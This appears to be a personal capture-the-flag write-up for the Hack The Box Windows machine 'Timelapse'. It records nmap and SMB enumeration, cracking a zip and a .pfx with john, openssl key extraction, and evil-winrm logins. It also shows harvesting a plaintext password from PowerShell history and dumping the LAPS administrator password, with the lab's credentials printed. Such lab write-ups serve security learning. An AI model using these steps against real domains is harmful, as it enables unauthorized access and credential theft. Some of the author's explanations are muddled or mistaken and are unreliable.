```

domain:timelapse.htb
ip address:10.10.11.152
os:windows
rated:Easy

```

# SCANNING
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1]                                                                                                                                                                                             
└─$ cat nmap.tzt                                                                                                                                                                                                                              
# Nmap 7.94SVN scan initiated Sun Mar 10 14:21:18 2024 as: nmap -Pn -sC -sV -oN nmap.tzt -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49730 10.10.11.152                                                   
Nmap scan report for 10.10.11.152                                                                                                                                                                                                             
Host is up, received user-set (0.51s latency).                                                                                                                                                                                                
Scanned at 2024-03-10 14:21:18 EDT for 141s                                                                                                                                                                                                   
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-03-11 02:21:26Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49730/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

# ENUMERATION
```
N/B: we can see multiple port numbers here and there, But the most interesting one is the one or msrpc that means that we can connect via with the machine remote but with valid creds

numerating shares(smb)

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1]
└─$ smbclient -L 10.10.11.152
Password for [WORKGROUP\alienx]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


N/B: ncacn_http keyword identifies the Microsoft Internet Information Server (IIS) as the protocol family for the endpoint. syntax


N/B: is the most interesting one it has the password protected zip file, we can try to crack it with john(zip2john and crack it with john and rockyou file)

zip pass:supremelegacy (for zipped file)


But if we check again we can see that we legacyy_dev_auth.pfx(google helped here was i was dealing with)

The (.pfx) stands for a protected protected file certificate

NB:A Personal Information Exchange (. pfx) Files, is **password protected file certificate commonly used for code signing your application**. It derives from the PKCS 12 archive file format certificate, and it stores multiple cryptographic objects within a single file: X. 509 public key certificates.

So this means that also the file is protected googled how to recover the file and found that also john can do this one(pfx2john)

pfx pass:thuglegacy
google_reference:reference:https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file

The abover article show that how we can extract the desired certificated(i.e cert.pem and key.pem) from the file


┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1/now]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx  -nokeys -out cert.pem 
Enter Import Password:


┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1/now]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out key.pem -nodes 
Enter Import Password:

```




# EXPLOITATION
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1/now]
└─$ evil-winrm -i 10.10.11.152 -c cert.pem -K key.pem -S
Evil-WinRM shell v3.5
Error: invalid option: -K

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1/now]
└─$ evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S

*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

# PRIVILEGE ESCALATION
```
N/B: lets start with enumerating users here with (net users command)

*Evil-WinRM* PS C:\Users\legacyy\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\legacyy\Desktop> 

We have like 10 users lets see what the got by trying to enumerate everyone and what juice potatoes the got here




LETS START WITH THE USER WE HAVE LOGIN IN AND SEE WHAT WE GOT
With legaccy we can see that is part of the remote management group and domain group but nothing of much interest at this time, But with this user since he is part of the domain group probably we can use something like crackmapexec and bloodhound to get more details about other user but for now its no user lemme got directy


ENUMERATING USERS:svc_deploy ( LAPS_Readers)
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.




N/B: This user as something very interesting i.e LAPS (local administrator password solution), which means that if we successful login as user svc_deploy we can manage to read administrator password.

So they must be somewhere here a password will be or some other means to get into svc_deploy(that was my qn?, went to my cheetsheet again and see)

STEP 1:
CHECKING THE powershell history(legaccy)

type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 

*Evil-WinRM* PS C:\Users\legacyy> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy> 



credentials for svc_deploy

username:svc_deploy
password:E3R$Q62^12p7PLlC%KWaxuaV


login with evil-winrm
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1]                                                                      │
└─$ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

TWO WAYS TO GET THE ADMINISTRATOR PASSWORD:

OPTION 1:
LINK:https://github.com/alien-keric/laps-py/blob/main/laps.py

we can use this script here to do this after downloading the script

command:python3 ldap.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb 

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/RESOLUT1]
└─$ python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb 
LAPS Dumper - Running at 03-11-2024 03:59:03
DC01 {,g(C}Vjfdp4!aIZEn@9mnX{

Administrator credentials: {,g(C}Vjfdp4!aIZEn@9mnX{

OPTION 2: 

LINK:reference:https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1

from this link here we can see that we can use a command like 

command:  Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *

MNSLogonAccount                      : False                                                                           
Modified                             : 3/10/2024 7:24:55 PM                                                            
modifyTimeStamp                      : 3/10/2024 7:24:55 PM                                                                                                                                                                                   
ms-Mcs-AdmPwd                        : {,g(C}Vjfdp4!aIZEn@9mnX{                                                        
ms-Mcs-AdmPwdExpirationTime          : 133550294950475005                                                              
msDFSR-ComputerReferenceBL           : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}


password:  {,g(C}Vjfdp4!aIZEn@9mnX{

now we can login via evil-winrm

evil-winrm -i 10.10.11.152 -u "Administrator" -p "{,g(C}Vjfdp4!aIZEn@9mnX{"


```
